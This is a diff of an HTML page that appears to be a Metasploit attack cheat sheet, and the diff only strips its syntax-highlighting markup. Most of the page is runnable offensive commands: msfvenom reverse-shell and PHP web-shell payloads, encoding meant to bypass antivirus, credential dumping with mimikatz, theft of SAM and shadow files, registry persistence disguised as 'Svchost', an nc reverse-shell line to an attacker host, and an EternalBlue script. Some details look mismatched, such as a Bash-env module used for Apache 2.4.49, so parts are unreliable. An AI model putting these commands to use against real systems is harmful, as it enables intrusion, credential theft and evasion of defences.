@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -129,19 +118,19 @@
 <h3 id="cachyosarch-linux-installation">CachyOS/Arch Linux Installation</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Install Metasploit Framework from AUR</span>
-yay<span class="w"> </span>-S<span class="w"> </span>metasploit
+<pre><code># Install Metasploit Framework from AUR
+yay -S metasploit
 
-<span class="c1"># Or use pacman if packaged</span>
-sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>metasploit
+# Or use pacman if packaged
+sudo pacman -S metasploit
 
-<span class="c1"># Verify installation</span>
-msfconsole<span class="w"> </span>-v
+# Verify installation
+msfconsole -v
 
-<span class="c1"># Initialize database (required on first run)</span>
-msfdb<span class="w"> </span>init
+# Initialize database (required on first run)
+msfdb init
 
-<span class="c1"># Start msfconsole</span>
+# Start msfconsole
 msfconsole
 </code></pre>
 </div>
@@ -149,35 +138,35 @@ msfconsole
 <h3 id="windows-installation">Windows Installation</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c"># Option 1: Windows Subsystem for Linux (WSL2)</span>
-<span class="c"># Follow Arch Linux instructions above</span>
+<pre><code># Option 1: Windows Subsystem for Linux (WSL2)
+# Follow Arch Linux instructions above
 
-<span class="c"># Option 2: Native Windows (older versions only)</span>
-<span class="c"># Download from: https://www.metasploit.com/download</span>
-<span class="c"># Not recommended - use WSL2 or Docker instead</span>
+# Option 2: Native Windows (older versions only)
+# Download from: https://www.metasploit.com/download
+# Not recommended - use WSL2 or Docker instead
 
-<span class="c"># Option 3: Docker</span>
-<span class="n">docker</span> <span class="n">pull</span> <span class="n">metasploitframework</span><span class="p">/</span><span class="n">metasploit-framework</span><span class="p">:</span><span class="n">latest</span>
-<span class="n">docker</span> <span class="n">run</span> <span class="n">-it</span> <span class="p">-</span><span class="n">-rm</span> <span class="n">metasploitframework</span><span class="p">/</span><span class="n">metasploit-framework</span><span class="p">:</span><span class="n">latest</span> <span class="n">msfconsole</span>
+# Option 3: Docker
+docker pull metasploitframework/metasploit-framework:latest
+docker run -it --rm metasploitframework/metasploit-framework:latest msfconsole
 </code></pre>
 </div>
 
 <h3 id="database-setup-critical">Database Setup (Critical)</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Initialize PostgreSQL database</span>
-msfdb<span class="w"> </span>init
+<pre><code># Initialize PostgreSQL database
+msfdb init
 
-<span class="c1"># Verify database is running</span>
-msfdb<span class="w"> </span>status
+# Verify database is running
+msfdb status
 
-<span class="c1"># If database fails to start</span>
-systemctl<span class="w"> </span>start<span class="w"> </span>postgresql
-msfdb<span class="w"> </span>delete<span class="w">  </span><span class="c1"># Clear corrupted database</span>
-msfdb<span class="w"> </span>init<span class="w">    </span><span class="c1"># Reinitialize</span>
+# If database fails to start
+systemctl start postgresql
+msfdb delete  # Clear corrupted database
+msfdb init    # Reinitialize
 
-<span class="c1"># Connect msfconsole to database</span>
-msfconsole<span class="w">    </span><span class="c1"># Automatically connects if database is running</span>
+# Connect msfconsole to database
+msfconsole    # Automatically connects if database is running
 </code></pre>
 </div>
 
@@ -297,23 +286,23 @@ msfconsole<span class="w">    </span><span class="c1"># Automatically connects i
 <p><strong>Scenario</strong>: You've identified Apache 2.4.49 vulnerability and need shell access.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-<span class="c1"># Search for Apache exploit</span>
-search<span class="w"> </span>apache<span class="w"> </span><span class="m">2</span>.4.49
+# Search for Apache exploit
+search apache 2.4.49
 
-<span class="c1"># Use specific exploit</span>
-use<span class="w"> </span>exploit/multi/http/apache_mod_cgi_bash_env_exec
+# Use specific exploit
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
-<span class="c1"># View required options</span>
-show<span class="w"> </span>options
+# View required options
+show options
 
-<span class="c1"># Set target</span>
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.100
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+# Set target
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set LPORT 4444
 
-<span class="c1"># Run exploit</span>
+# Run exploit
 exploit
 </code></pre>
 </div>
@@ -330,21 +319,21 @@ meterpreter &gt;
 <p><strong>Scenario</strong>: You've generated a standalone payload and need to catch the connection.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-<span class="c1"># Set up handler</span>
-use<span class="w"> </span>exploit/multi/handler
+# Set up handler
+use exploit/multi/handler
 
-<span class="c1"># Configure for your payload type</span>
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+# Configure for your payload type
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
 
-<span class="c1"># Start listening</span>
-exploit<span class="w"> </span>-j<span class="w">  </span><span class="c1"># -j = run in background job</span>
+# Start listening
+exploit -j  # -j = run in background job
 
-<span class="c1"># Interact with session when target connects</span>
-sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+# Interact with session when target connects
+sessions -i 1
 </code></pre>
 </div>
 
@@ -353,26 +342,26 @@ sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</spa
 <p><strong>Scenario</strong>: Target system doesn't have direct network access. Generate payload on attacker machine.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Generate Windows meterpreter reverse shell</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
+<pre><code># Generate Windows meterpreter reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f exe -o payload.exe
 
-<span class="c1"># Generate Linux meterpreter reverse shell</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>payload
+# Generate Linux meterpreter reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f elf -o payload
 
-<span class="c1"># Generate encoded payload (bypass antivirus)</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload_encoded.exe
+# Generate encoded payload (bypass antivirus)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 3 \
+  -f exe -o payload_encoded.exe
 
-<span class="c1"># Generate web shell</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>raw<span class="w"> </span>-o<span class="w"> </span>shell.php
+# Generate web shell
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -f raw -o shell.php
 </code></pre>
 </div>
 
@@ -381,20 +370,20 @@ msfvenom<span class="w"> </span>-p<span class="w"> </span>php/meterpreter/revers
 <p><strong>Scenario</strong>: You have shell access and need to enumerate system for privilege escalation.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In meterpreter session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps<span class="w">  </span><span class="c1"># List processes</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ipconfig<span class="w">  </span><span class="c1"># Network configuration</span>
+<pre><code># In meterpreter session
+meterpreter &gt; sysinfo
+meterpreter &gt; getuid
+meterpreter &gt; ps  # List processes
+meterpreter &gt; ipconfig  # Network configuration
 
-<span class="c1"># Check privileges</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getprivs
+# Check privileges
+meterpreter &gt; getprivs
 
-<span class="c1"># Load post-exploitation scripts</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>load<span class="w"> </span>powershell
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>powershell_shell
-PS<span class="w"> </span>&gt;<span class="w"> </span>Get-LocalUser
-PS<span class="w"> </span>&gt;<span class="w"> </span>Get-LocalGroupMember<span class="w"> </span>-Group<span class="w"> </span><span class="s2">&quot;Administrators&quot;</span>
+# Load post-exploitation scripts
+meterpreter &gt; load powershell
+meterpreter &gt; powershell_shell
+PS &gt; Get-LocalUser
+PS &gt; Get-LocalGroupMember -Group &quot;Administrators&quot;
 </code></pre>
 </div>
 
@@ -403,15 +392,15 @@ PS<span class="w"> </span>&gt;<span class="w"> </span>Get-LocalGroupMember<span 
 <p><strong>Scenario</strong>: Exploit runs as low-privilege user; need to escalate to SYSTEM/root.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In meterpreter session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/linux/escalate/getsystem
-<span class="c1"># or</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/escalate/ms16_032
+<pre><code># In meterpreter session
+meterpreter &gt; run post/linux/escalate/getsystem
+# or
+meterpreter &gt; run post/windows/escalate/ms16_032
 
-<span class="c1"># If automated doesn&#39;t work, manually exploit</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>post/linux/privilege_escalation/pkexec
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>SESSION<span class="w"> </span><span class="m">1</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>exploit
+# If automated doesn&#39;t work, manually exploit
+meterpreter &gt; use post/linux/privilege_escalation/pkexec
+meterpreter &gt; set SESSION 1
+meterpreter &gt; exploit
 </code></pre>
 </div>
 
@@ -420,16 +409,16 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>exploit
 <p><strong>Scenario</strong>: Extract password hashes from compromised Windows system.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In meterpreter session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>load<span class="w"> </span>kiwi
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>creds_all
+<pre><code># In meterpreter session
+meterpreter &gt; load kiwi
+meterpreter &gt; creds_all
 
-<span class="c1"># Alternative: hashdump</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>post/windows/gather/hashdump
+# Alternative: hashdump
+meterpreter &gt; run post/windows/gather/hashdump
 
-<span class="c1"># Dump LSASS for more credentials</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>load<span class="w"> </span>mimikatz
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>mimikatz_command<span class="w"> </span>-m<span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span>
+# Dump LSASS for more credentials
+meterpreter &gt; load mimikatz
+meterpreter &gt; mimikatz_command -m &quot;sekurlsa::logonpasswords&quot;
 </code></pre>
 </div>
 
@@ -438,16 +427,16 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>mimikatz_command<
 <p><strong>Scenario</strong>: Steal sensitive files from target system.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Download files</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>/etc/passwd<span class="w"> </span>/tmp/passwd
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>c:<span class="se">\\</span>windows<span class="se">\\</span>system32<span class="se">\\</span>config<span class="se">\\</span>sam<span class="w"> </span>/tmp/sam
+<pre><code># Download files
+meterpreter &gt; download /etc/passwd /tmp/passwd
+meterpreter &gt; download c:\\windows\\system32\\config\\sam /tmp/sam
 
-<span class="c1"># Search for files</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;*.sql&quot;</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;*.conf&quot;</span>
+# Search for files
+meterpreter &gt; search -f &quot;*.sql&quot;
+meterpreter &gt; search -f &quot;*.conf&quot;
 
-<span class="c1"># Upload files</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/tmp/malware.exe<span class="w"> </span>c:<span class="se">\\</span>temp<span class="se">\\</span>
+# Upload files
+meterpreter &gt; upload /tmp/malware.exe c:\\temp\\
 </code></pre>
 </div>
 
@@ -456,15 +445,15 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>upload<span class
 <p><strong>Scenario</strong>: Maintain access even after reboot or user logout.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># In meterpreter session (Windows)</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>persistence<span class="w"> </span>-X<span class="w"> </span>-i<span class="w"> </span><span class="m">60</span><span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.1.50
+<pre><code># In meterpreter session (Windows)
+meterpreter &gt; run persistence -X -i 60 -p 4444 -r 192.168.1.50
 
-<span class="c1"># Linux persistence</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>persistence<span class="w"> </span>-X<span class="w"> </span>-i<span class="w"> </span><span class="m">60</span><span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.1.50
+# Linux persistence
+meterpreter &gt; run persistence -X -i 60 -p 4444 -r 192.168.1.50
 
-<span class="c1"># Manual registry modification (Windows)</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w"> </span>enumkey<span class="w"> </span>-k<span class="w"> </span>HKLM<span class="se">\\</span>Software<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>Run
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w"> </span>setval<span class="w"> </span>-k<span class="w"> </span>HKLM<span class="se">\\</span>Software<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>Run<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;Svchost&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;c:\\windows\\temp\\svchost.exe&quot;</span>
+# Manual registry modification (Windows)
+meterpreter &gt; reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\Run
+meterpreter &gt; reg setval -k HKLM\\Software\\Microsoft\\Windows\\Run -v &quot;Svchost&quot; -d &quot;c:\\windows\\temp\\svchost.exe&quot;
 </code></pre>
 </div>
 
@@ -473,15 +462,15 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w
 <p><strong>Scenario</strong>: Pivot to internal network from compromised system.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># From meterpreter session</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>arp_scanner<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.1.0/24
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>tcp_portscan<span class="w"> </span>-rhosts<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-ports<span class="w"> </span><span class="m">22</span>,80,443,3306
+<pre><code># From meterpreter session
+meterpreter &gt; run arp_scanner -r 192.168.1.0/24
+meterpreter &gt; run tcp_portscan -rhosts 192.168.1.0/24 -ports 22,80,443,3306
 
-<span class="c1"># Or use auxiliary modules</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
-msf<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span>auxiliary/scanner/smb/smb_version
-msf<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.0/24
-msf<span class="w"> </span>&gt;<span class="w"> </span>run
+# Or use auxiliary modules
+meterpreter &gt; background
+msf &gt; use auxiliary/scanner/smb/smb_version
+msf &gt; set RHOSTS 192.168.1.0/24
+msf &gt; run
 </code></pre>
 </div>
 
@@ -490,16 +479,16 @@ msf<span class="w"> </span>&gt;<span class="w"> </span>run
 <p><strong>Scenario</strong>: Uploaded web shell; now convert to meterpreter session.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># First, get reverse shell via web shell or PHP execution</span>
-<span class="c1"># nc -e /bin/bash attacker_ip 4444</span>
+<pre><code># First, get reverse shell via web shell or PHP execution
+# nc -e /bin/bash attacker_ip 4444
 
-<span class="c1"># Meanwhile, set up handler</span>
+# Meanwhile, set up handler
 msfconsole
-use<span class="w"> </span>exploit/multi/handler
-<span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>linux/x86/meterpreter/reverse_tcp
-<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
-<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
-exploit<span class="w"> </span>-j
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit -j
 </code></pre>
 </div>
 
@@ -508,20 +497,20 @@ exploit<span class="w"> </span>-j
 <p><strong>Scenario</strong>: Use nmap scan results to quickly target vulnerable services.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Export nmap XML</span>
-nmap<span class="w"> </span>-sV<span class="w"> </span>--script<span class="w"> </span>vuln<span class="w"> </span>-oX<span class="w"> </span>scan.xml<span class="w"> </span><span class="m">192</span>.168.1.100
+<pre><code># Export nmap XML
+nmap -sV --script vuln -oX scan.xml 192.168.1.100
 
-<span class="c1"># Import into Metasploit</span>
-db_import<span class="w"> </span>scan.xml
+# Import into Metasploit
+db_import scan.xml
 
-<span class="c1"># View hosts</span>
+# View hosts
 hosts
 services
 
-<span class="c1"># Search and exploit based on nmap findings</span>
-search<span class="w"> </span>type:exploit<span class="w"> </span>platform:windows<span class="w"> </span>smb
-use<span class="w"> </span>exploit/windows/smb/ms17_010_eternalblue
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="o">[</span>IP<span class="w"> </span>from<span class="w"> </span>services<span class="w"> </span>list<span class="o">]</span>
+# Search and exploit based on nmap findings
+search type:exploit platform:windows smb
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS [IP from services list]
 exploit
 </code></pre>
 </div>
@@ -531,24 +520,24 @@ exploit
 <p><strong>Scenario</strong>: Generated payload flagged by antivirus. Need to encode/obfuscate.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Single encoding iteration</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
+<pre><code># Single encoding iteration
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai \
+  -f exe -o payload.exe
 
-<span class="c1"># Multiple encoding iterations</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-i<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
+# Multiple encoding iterations
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o payload.exe
 
-<span class="c1"># Chain multiple encoders</span>
-msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-e<span class="w"> </span>x86/jmp_call_additive<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
+# Chain multiple encoders
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.50 LPORT=4444 \
+  -e x86/shikata_ga_nai \
+  -e x86/jmp_call_additive \
+  -f exe -o payload.exe
 </code></pre>
 </div>
 
@@ -557,23 +546,23 @@ msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/re
 <p><strong>Scenario</strong>: Run complex multi-step exploitation sequence automatically.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Create exploit.rc resource script</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span>exploit.rc<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
-<span class="s">use exploit/windows/smb/ms17_010_eternalblue</span>
-<span class="s">set RHOSTS 192.168.1.100</span>
-<span class="s">set PAYLOAD windows/meterpreter/reverse_tcp</span>
-<span class="s">set LHOST 192.168.1.50</span>
-<span class="s">set LPORT 4444</span>
-<span class="s">exploit -j</span>
-<span class="s">use exploit/multi/handler</span>
-<span class="s">set PAYLOAD windows/meterpreter/reverse_tcp</span>
-<span class="s">set LHOST 192.168.1.50</span>
-<span class="s">set LPORT 4444</span>
-<span class="s">exploit -j</span>
-<span class="s">EOF</span>
+<pre><code># Create exploit.rc resource script
+cat &gt; exploit.rc &lt;&lt; &#39;EOF&#39;
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit -j
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+exploit -j
+EOF
 
-<span class="c1"># Run resource script</span>
-msfconsole<span class="w"> </span>-r<span class="w"> </span>exploit.rc
+# Run resource script
+msfconsole -r exploit.rc
 </code></pre>
 </div>
 
@@ -582,25 +571,25 @@ msfconsole<span class="w"> </span>-r<span class="w"> </span>exploit.rc
 <p><strong>Scenario</strong>: Multiple exploits running; need to manage active sessions.</p>
 
 <div class="codehilite">
-<pre><span></span><code>msfconsole
+<pre><code>msfconsole
 
-<span class="c1"># List all sessions</span>
+# List all sessions
 sessions
 
-<span class="c1"># Interact with specific session</span>
-sessions<span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+# Interact with specific session
+sessions -i 1
 
-<span class="c1"># Run commands in background</span>
-sessions<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">1</span>
+# Run commands in background
+sessions -c &quot;whoami&quot; -i 1
 
-<span class="c1"># Kill inactive session</span>
-sessions<span class="w"> </span>-k<span class="w"> </span><span class="m">1</span>
+# Kill inactive session
+sessions -k 1
 
-<span class="c1"># Create new shell from meterpreter</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>shell
-cmd<span class="w"> </span>&gt;<span class="w"> </span>whoami
-cmd<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">exit</span>
-meterpreter<span class="w"> </span>&gt;
+# Create new shell from meterpreter
+meterpreter &gt; shell
+cmd &gt; whoami
+cmd &gt; exit
+meterpreter &gt;
 </code></pre>
 </div>
 
@@ -609,26 +598,26 @@ meterpreter<span class="w"> </span>&gt;
 <p><strong>Scenario</strong>: Once in meterpreter, leverage advanced post-exploitation features.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># File system operations</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">pwd</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ls<span class="w"> </span>-la
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>mkdir<span class="w"> </span>backup
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>/etc/shadow
+<pre><code># File system operations
+meterpreter &gt; pwd
+meterpreter &gt; ls -la
+meterpreter &gt; cd /tmp
+meterpreter &gt; mkdir backup
+meterpreter &gt; cat /etc/shadow
 
-<span class="c1"># Process operations</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps<span class="w"> </span>aux
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span><span class="nb">kill</span><span class="w"> </span><span class="m">1234</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>execute<span class="w"> </span>-f<span class="w"> </span>/bin/bash<span class="w"> </span>-i
+# Process operations
+meterpreter &gt; ps aux
+meterpreter &gt; kill 1234
+meterpreter &gt; execute -f /bin/bash -i
 
-<span class="c1"># Network operations</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ifconfig
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>netstat
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>route
+# Network operations
+meterpreter &gt; ifconfig
+meterpreter &gt; netstat
+meterpreter &gt; route
 
-<span class="c1"># Registry operations (Windows)</span>
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\\</span>Software<span class="se">\\</span>Microsoft<span class="se">\\</span>Windows<span class="se">\\</span>Run
-meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w"> </span><span class="nb">set</span><span class="w"> </span>HKLM<span class="se">\\</span>Software<span class="w"> </span>key<span class="w"> </span>value
+# Registry operations (Windows)
+meterpreter &gt; reg query HKLM\\Software\\Microsoft\\Windows\\Run
+meterpreter &gt; reg set HKLM\\Software key value
 </code></pre>
 </div>
 
@@ -864,33 +853,33 @@ meterpreter<span class="w"> </span>&gt;<span class="w"> </span>reg<span class="w
 <p><strong>Goal</strong>: Discover vulnerable service, exploit, escalate privileges, maintain access.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Step 1: Network reconnaissance</span>
